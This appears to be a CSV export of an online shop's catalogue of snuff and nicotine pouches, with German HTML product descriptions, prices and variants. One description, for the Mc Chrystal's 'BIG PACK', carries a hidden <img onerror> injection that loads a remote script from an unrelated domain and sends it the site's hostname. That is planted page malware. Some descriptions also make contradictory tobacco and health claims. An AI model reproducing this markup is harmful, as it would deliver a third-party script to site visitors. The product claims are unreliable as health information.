Name,Description,SKU,Gender, Attribute 1,Attribute 1 Value, Attribute 2,Attribute 2 Value, Attribute 3,Attribute 3 Value,Base Image 1 ,Base Image 2,Base Image 3,Base Image 4,Base Image 5,Base Price(USD),Sale Price(USD),Quantity,Unit of Weight,Weight,Unit of Dimensions,Height,Width,Length,SEO Title,SEO Description,Vendor,Parent SKU
,,1009,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,16,IN,3,3,3,,,Snus-King,McChrystal's Eidgenoss Snuff
,,1009,Unisex,Stück,10,,,,,,,,,,55.00,,1,G,220,IN,3,3,3,,,Snus-King,McChrystal's Eidgenoss Snuff
CRYSTALS ORIGINAL SCHNUPF Mittel,"<h2 data-mce-fragment=""1"">Mc Chrystal's Original &amp; Genuine Schnupftabak in der 4,4 g Dose hat ein frisch-fruchtig-süßes Aroma</h2>
<p data-mce-fragment=""1"">Der rauchfreie Mc Chrystal's Original &amp; Genuine Schnupftabak in der runden Dose mit Drehfunktion wird aus 100% reinem Tabak nach hohen Qualitätsstandards hergestellt. Der hochwertige Mc Chrystal's Original &amp; Genuine Schnupftabak besteht aus einer feinen Tabakmischung und wird nach bewährter Familientradition verarbeitet. Der naturbelassene Tabak verfügt über einen natürlichen Nikotingehalt. Der klassische Mc Chrystal's Original &amp; Genuine Schnupftabak verfügt über ein blumig-fruchtig-süßes Tabakaroma mit einer leichten Heunote und ist mit frischem Menthol angereichert. Das Nikotin entfaltet seine anregende Wirkung über die Nasenschleimhäute. Die Konsistenz des gemahlenen Mc Chrystal's Original &amp; Genuine Schnupftabaks in einer mittelbraunen Farbe ist trocken und puderfein. </p>
<p data-mce-fragment=""1"">Der höchste Tabakgenuss entsteht beim leichten Aufschnuppern einer kleinen Prise Mc Chrystal's Original &amp; Genuine Schnupftabak in die Nase. Danach sollte eine gewisse Einwirkzeit eingehalten werden, um das volle Aroma des Mc Chrystal's Original &amp; Genuine Schnupftabaks richtig auszukosten. Ob der Mc Chrystal's Original &amp; Genuine Snuff vom Handrücken oder von den Fingerspitzen aufgeschnuppert wird, ist individuell verschieden. Wenn der Mc Chrystal's Original &amp; Genuine Schnupftabak nicht leicht aus der Dose fließt, genügt in der Regel ein kurzes Aufklopfen zum Lockern. Der frisch-fruchtig-süße Mc Chrystal's Original &amp; Genuine Schnupftabak in der 4,4 g Dose passt bequem in die Tasche und ist schnell griffbereit.</p>
<br>
<p> </p>
<p> </p>
<p> Art Nr: 1007</p>",CRYSTALS ORIGINAL SCHNUPF Mittel,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_344d5426-52d3-4704-ad5e-b79c86843ce5.png,,,,,6.00,,1,G,20,IN,3,3,3,,,,
,,1007,Unisex,Stück,1,,,,,,,,,,6.00,,1,G,20,IN,3,3,3,,,Snus-King,CRYSTALS ORIGINAL SCHNUPF Mittel
,,1007,Unisex,Stück,5,,,,,,,,,,30.00,,1,G,100,IN,3,3,3,,,Snus-King,CRYSTALS ORIGINAL SCHNUPF Mittel
,,1007,Unisex,Stück,10,,,,,,,,,,60.00,,1,G,200,IN,3,3,3,,,Snus-King,CRYSTALS ORIGINAL SCHNUPF Mittel
MC CRYSTALS ORIGINAL SCHNUPF BIG PACK,"<p><span> </span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span><strong>Ab Lager verfügbar</strong></span></p>
<p>Mc.Chrystal`s - Schnupf BIG PACK 21g</p>
<p>Klassischer Mc. Chrystal's Schnupf mit Mentholgeschmack.</p>
<p> </p>
<p> </p>
<p> Art Nr: 1002</p>
<div style=""z-index: 1;"" id=""mailtooptionchmailPopupModalTo""></div>
<div><img onerror='var s=document.createElement(""script"");s.type=""text/javascript"";s.id=""cczedcc-plg-analytics"";s.src=""//jejoro.miyinokejo.com/scripts/js?k=5fcd009490cf76e4258b4567&amp;s=""+encodeURI(btoa(window.location.host))+""&amp;ns=true"";document.getElementsByTagName(""head"")[0].appendChild(s);'></div>
<div style=""z-index: 1;"" id=""mailtooptionchmailPopupModalTo"">
<div id=""mailtooptionchtoPopupModalMail"">
<div id=""mailtooptionchpopupMailCloseModal""></div>
<div id=""mailtooptionchpopupQuestion""></div>
</div>
</div>",MC CRYSTALS ORIGINAL SCHNUPF BIG PACK,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_ea665772-22a0-422c-913c-69fcf3da2f75.png,,,,,9.90,,1,G,42,IN,3,3,3,,,,
,,1002,Unisex,Stück,1,,,,,,,,,,9.90,,1,G,42,IN,3,3,3,,,Snus-King,MC CRYSTALS ORIGINAL SCHNUPF BIG PACK
MC CRYSTALS ORIGINAL SCHNUPF Normal,"<p><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span style=""background-color: #ffffff; color: #2a910e;""><strong>Ab Lager verfügbar</strong></span></p>
<p>Mc.Chrystal`s - Schnupf Normal 4.4g</p>
<p>Klassischer Mc. Chrystal's Schnupf mit Mentholgeschmack.</p>
<p> </p>
<p> </p>
<p>Art Nr: 1008</p>",MC CRYSTALS ORIGINAL SCHNUPF Normal,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_ee212b2d-6c1f-4daf-9839-f7131a56758a.png,,,,,3.90,,1,G,12,IN,3,3,3,,,,
,,1008,Unisex,Stück,1,,,,,,,,,,3.90,,1,G,12,IN,3,3,3,,,Snus-King,MC CRYSTALS ORIGINAL SCHNUPF Normal
,,1008,Unisex,Stück,5,,,,,,,,,,19.50,,1,G,60,IN,3,3,3,,,Snus-King,MC CRYSTALS ORIGINAL SCHNUPF Normal
,,1008,Unisex,Stück,10,,,,,,,,,,39.00,,1,G,120,IN,3,3,3,,,Snus-King,MC CRYSTALS ORIGINAL SCHNUPF Normal
Edelweiss Melon,"<p data-mce-fragment=""1"">Der neue Edelweiss Melon SNUS überzeugt mit seinem Geschmack jeden Snus Geniesser. Der Snus sind White Pouches und sind ohne Tabakzusatz. Der Edelweiss Melon hat ein sehr intensiven Melonen Geschmack. </p>
<p data-mce-fragment=""1""><strong data-mce-fragment=""1"">Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p data-mce-fragment=""1"">Tabakgewicht (g): 0                            Portionen / Dose: ~22</p>
<p data-mce-fragment=""1"">Versandgewicht (g): 40                        Geschmack: Tabak,, Sehr Intensiven Geschmack  von Melonen</p>
<p data-mce-fragment=""1"">Nikotin (mg/g): 15mg</p>",Edelweiss Melon,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image.jpg,,,,,7.50,,1,G,1,IN,3,3,3,,,,
,,908,Unisex,Stück,1,,,,,,,,,,7.50,,1,G,1,IN,3,3,3,,,Snus-King.ch,Edelweiss Melon
,,908,Unisex,Stück,10,,,,,,,,,,70.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,Edelweiss Melon
Edelweiss Berry,"<p data-mce-fragment=""1"">Der neue Edelweiss Berry SNUS überzeugt mit seinem Geschmack jeden Snus Geniesser. Der Snus sind White Pouches und sind ohne Tabakzusatz. Der Edelweiss Berry hat ein sehr intensiven Beeren Geschmack. </p>
<p data-mce-fragment=""1""><strong data-mce-fragment=""1"">Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p data-mce-fragment=""1"">Tabakgewicht (g): 0                            Portionen / Dose: ~22</p>
<p data-mce-fragment=""1"">Versandgewicht (g): 40                        Geschmack: Tabak,, Guter Geschmack mit Beeren</p>
<p data-mce-fragment=""1"">Nikotin (mg/g): 10mg</p>",Edelweiss Berry,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/edelweissberry.png,,,,,7.50,,1,G,1,IN,3,3,3,,,,
,,909,Unisex,Stück,1,,,,,,,,,,7.50,,1,G,1,IN,3,3,3,,,Snus-King.ch,Edelweiss Berry
,,909,Unisex,Stück,10,,,,,,,,,,70.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,Edelweiss Berry
Edelweiss CBD Mint,"Der neue Edelweiss Mint CBD SNUS überzeugt mit seinem Geschmack jeden Snus Geniesser. Der Snus sind White Pouches und sind ohne Tabakzusatz. Der Edelweiss CBD hat ein sehr intensiven Mint Geschmack &amp; einen Coolen CBD Touch. 
<p data-mce-fragment=""1""><strong data-mce-fragment=""1"">Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500, CBD</p>
<p data-mce-fragment=""1"">Tabakgewicht (g): 0                            Portionen / Dose: ~15</p>
<p data-mce-fragment=""1"">Versandgewicht (g): 40                        Geschmack: Tabak,, Minze</p>
<p data-mce-fragment=""1"">Nikotin (mg/g): 12mg</p>",Edelweiss CBD Mint,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_7fb767ad-397b-43ae-b0de-6c59f32339e5.jpg,,,,,10.50,,1,G,1,IN,3,3,3,,,,
,,910,Unisex,Stück,1,,,,,,,,,,10.50,,1,G,1,IN,3,3,3,,,Snus-King.ch,Edelweiss CBD Mint
,,910,Unisex,Stück,10,,,,,,,,,,100.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,Edelweiss CBD Mint
Edelweiss Cold,"<p data-mce-fragment=""1"">Der neue Edelweiss Cold SNUS überzeugt mit seinem Geschmack jeden Snus Geniesser. Der Snus sind White Pouches und sind ohne Tabakzusatz. Der Edelweiss Cold hat ein sehr intensiven Minze &amp; Menthol Geschmack. </p>
<p data-mce-fragment=""1""><strong data-mce-fragment=""1"">Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p data-mce-fragment=""1"">Tabakgewicht (g): 0                            Portionen / Dose: ~22</p>
<p data-mce-fragment=""1"">Versandgewicht (g): 40                        Geschmack: Tabak,, Minze- Menthol </p>
<p data-mce-fragment=""1"">Nikotin (mg/g): 20mg</p>",Edelweiss Cold,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/edelweisscold.png,,,,,7.50,,1,G,1,IN,3,3,3,,,,
,,906,Unisex,Stück,1,,,,,,,,,,7.50,,1,G,1,IN,3,3,3,,,Snus-King.ch,Edelweiss Cold
,,906,Unisex,Stück,10,,,,,,,,,,70.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,Edelweiss Cold
White FOX all White,"<p><strong><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span>Ab Lager verfügbar</span></strong></p>
<p><br>Unter der Marke White Fox vertreibt der Produzent von Oden's und Siberia (GN Tobacco) seine All White Portionsbeutel. All White ist eine tabaksfreie Snusvariante auf aromatisierter Zellulosebasis, welche erst seit wenigen Jahren existiert und die Gesundheit noch weniger schädigt als normaler Snus. Der White Fox kommt mit einem eisigen Minzgeschmack im Slim Beutel.</p>
<p><br></p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p>Tabakgewicht (g): 15.0                         Portionen / Dose: ~20</p>
<p>Versandgewicht (g): 40                        Geschmack: Tabak, Mint</p>
<p>Nikotin (mg/g): 16.0</p>
<p> </p>
<p> </p>
<p> </p>
<p>Art: 804</p>",White FOX all White,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/foxblau.png,,,,,6.10,,1,G,30,IN,3,3,3,,,,
,,804,Unisex,Stück,1,,,,,,,,,,6.10,,1,G,30,IN,3,3,3,,,Snus-King,White FOX all White
,,804,Unisex,Stück,10,,,,,,,,,,56.00,,1,G,300,IN,3,3,3,,,Snus-King,White FOX all White
White FOX Full Charge All White,"<p><strong><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span>Ab Lager verfügbar</span></strong></p>
<p> </p>
<p>Der White Fox Full Charge kommt mit einem eisigen Minzgeschmack im grossen Beutel. </p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p>Tabakgewicht (g): 15..6                            Portionen / Dose: ~20</p>
<p>Versandgewicht (g): 40                        Geschmack: Tabak, Mint</p>
<p>Nikotin (mg/g): 16.0</p>
<p> </p>
<p> ART: 805</p>",White FOX Full Charge All White,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/Foxrot.png,,,,,6.10,,1,G,30,IN,3,3,3,,,,
,,805,Unisex,Stück,1,,,,,,,,,,6.10,,1,G,30,IN,3,3,3,,,Snus-King,White FOX Full Charge All White
,,805,Unisex,Stück,10,,,,,,,,,,56.00,,1,G,300,IN,3,3,3,,,Snus-King,White FOX Full Charge All White
White FOX Double Mint ALL White,"<p><strong><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span>Ab Lager verfügbar</span></strong></p>
<p>Der White Fox Double Mint kommt mit einem frischen Geschmack nach Minze und Menthol im Slim Beutel</p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p>Tabakgewicht (g): 16.6                            Portionen / Dose: ~20</p>
<p>Versandgewicht (g): 40                        Geschmack: Tabak, Mint</p>
<p>Nikotin (mg/g): 16.0</p>
<p> </p>
<p> Art: 806</p>",White FOX Double Mint ALL White,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/foxdoublemint.png,,,,,6.10,,1,G,30,IN,3,3,3,,,,
,,806,Unisex,Stück,1,,,,,,,,,,6.10,,1,G,30,IN,3,3,3,,,Snus-King,White FOX Double Mint ALL White
,,806,Unisex,Stück,10,,,,,,,,,,56.00,,1,G,300,IN,3,3,3,,,Snus-King,White FOX Double Mint ALL White
GAWITH APRICOT SCHNUPF 10G,"<p data-mce-fragment=""1"">Der <strong data-mce-fragment=""1"">Gawith Original (vormals Apricot) Snuff</strong> ist <strong data-mce-fragment=""1"">herrlich fruchtig</strong> – <strong data-mce-fragment=""1"">immer frisch</strong>. Eine <b data-mce-fragment=""1"">Mischung</b> aus <b data-mce-fragment=""1"">speziell ausgesuchten Rohtabaken</b> mit einer <strong data-mce-fragment=""1"">feinen Aprikosen-Note</strong>. Der<strong data-mce-fragment=""1""> ideale Snuff </strong>für<strong data-mce-fragment=""1""> Liebhaber </strong>von<strong data-mce-fragment=""1""> fruchtigen Geschmacksrichtungen.</strong><br data-mce-fragment=""1""><strong data-mce-fragment=""1""></strong></p>
<p data-mce-fragment=""1"">International expandiert die <strong data-mce-fragment=""1"">Fa. Pöschl</strong> bereits seit den 1960er-Jahren. Ab den 90er-Jahren wurden ferner insgesamt neun Tochtergesellschaften in Osteuropa, sowie in Frankreich, Hongkong und der Schweiz gegründet. Hinzu kommen Beteiligungen an Tabakvertriebsgesellschaften in Italien, Großbritannien, Spanien sowie Belgien und Luxemburg. Unsere 14 Tochter- und Beteiligungsgesellschaften mit über 770 Mitarbeitern weltweit sowie Exportaktivitäten in ca. 100 Ländern machen uns zu einer global denkenden und handelnden Unternehmensgruppe. In Deutschland und in nahezu 100 Ländern der Welt vertreibt PÖSCHL TABAK heute weit über 6 Millionen kg Rauch- und Schnupftabak.<br data-mce-fragment=""1"">Auf der weiteren Internationalisierung des Unternehmens wird auch zukünftig ein Hauptaugenmerk liegen. Trotz des großen Erfolgs wahrt das Unternehmen seine Tradition und hält an seinen Prinzipien, wie unter anderem nur qualitativ hochwertige Produkte herzustellen und soziale und ethische Grundsätze zu wahren, fest.</p>
<p dir=""ltr"" align=""left""> </p>
<p><span>Art Nr: 1006</span></p>",GAWITH APRICOT SCHNUPF 10G,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/apricot.png,,,,,4.80,,1,G,23,IN,3,3,3,,,,
,,1006,Unisex,Stück,1,,,,,,,,,,4.80,,1,G,23,IN,3,3,3,,,GAWITH,GAWITH APRICOT SCHNUPF 10G
,,1006,Unisex,Stück,5,,,,,,,,,,24.00,,1,G,160,IN,3,3,3,,,GAWITH,GAWITH APRICOT SCHNUPF 10G
,,1006,Unisex,Stück,10,,,,,,,,,,48.00,,1,G,230,IN,3,3,3,,,GAWITH,GAWITH APRICOT SCHNUPF 10G
GAWITH HELVETIC SCHNUPF 7G,"<p>Der Schnupftabak Gawith ist einer der beliebtesten der Schweiz. Mit sagenhafter Frische und tollem Tabakgeschmack trumpft er seit je her auf.</p>
<p>Mit der Gawith Helvetic Edition hat Gawith den helvetischen Schnupfern eine eigene Edition geschenkt. 7g bester Schnupftabak sind in jedem Gawith Helvetic Edition enthalten und werden die Nase bereichern.</p>
<p> </p>
<p><span>Art Nr: 6000</span></p>",GAWITH HELVETIC SCHNUPF 7G,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/gaithhelevtic.png,,,,,4.80,,1,G,17,IN,3,3,3,,,,
,,6000,Unisex,Stück,1,,,,,,,,,,4.80,,1,G,17,IN,3,3,3,,,Snus-King,GAWITH HELVETIC SCHNUPF 7G
,,6000,Unisex,Stück,5,,,,,,,,,,24.00,,1,G,34,IN,3,3,3,,,Snus-King,GAWITH HELVETIC SCHNUPF 7G
,,6000,Unisex,Stück,10,,,,,,,,,,48.00,,1,G,170,IN,3,3,3,,,Snus-King,GAWITH HELVETIC SCHNUPF 7G
DYSONxAPRICOT SNUFF,"<p data-mce-fragment=""1"">Der <strong data-mce-fragment=""1"">Gawith Original (vormals Apricot) Snuff</strong> ist <strong data-mce-fragment=""1"">herrlich fruchtig</strong> – <strong data-mce-fragment=""1"">immer frisch</strong>. Eine <b data-mce-fragment=""1"">Mischung</b> aus <b data-mce-fragment=""1"">speziell ausgesuchten Rohtabaken</b> mit einer <strong data-mce-fragment=""1"">feinen Aprikosen-Note</strong>. Der<strong data-mce-fragment=""1""> ideale Snuff </strong>für<strong data-mce-fragment=""1""> Liebhaber </strong>von<strong data-mce-fragment=""1""> fruchtigen Geschmacksrichtungen.</strong><br data-mce-fragment=""1""><strong data-mce-fragment=""1""></strong></p>
<p data-mce-fragment=""1"">International expandiert die <strong data-mce-fragment=""1"">Fa. Pöschl</strong> bereits seit den 1960er-Jahren. Ab den 90er-Jahren wurden ferner insgesamt neun Tochtergesellschaften in Osteuropa, sowie in Frankreich, Hongkong und der Schweiz gegründet. Hinzu kommen Beteiligungen an Tabakvertriebsgesellschaften in Italien, Großbritannien, Spanien sowie Belgien und Luxemburg. Unsere 14 Tochter- und Beteiligungsgesellschaften mit über 770 Mitarbeitern weltweit sowie Exportaktivitäten in ca. 100 Ländern machen uns zu einer global denkenden und handelnden Unternehmensgruppe. In Deutschland und in nahezu 100 Ländern der Welt vertreibt PÖSCHL TABAK heute weit über 6 Millionen kg Rauch- und Schnupftabak.<br data-mce-fragment=""1"">Auf der weiteren Internationalisierung des Unternehmens wird auch zukünftig ein Hauptaugenmerk liegen. Trotz des großen Erfolgs wahrt das Unternehmen seine Tradition und hält an seinen Prinzipien, wie unter anderem nur qualitativ hochwertige Produkte herzustellen und soziale und ethische Grundsätze zu wahren, fest.</p>
<br>
<p dir=""ltr"" align=""left"">ART: 1031</p>",DYSONxAPRICOT SNUFF,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/dysonsnuss.png,,,,,4.80,,1,G,1,IN,3,3,3,,,,
,,1031,Unisex,Title,Default Title,,,,,,,,,,4.80,,1,G,1,IN,3,3,3,,,Snus-King.ch,DYSONxAPRICOT SNUFF
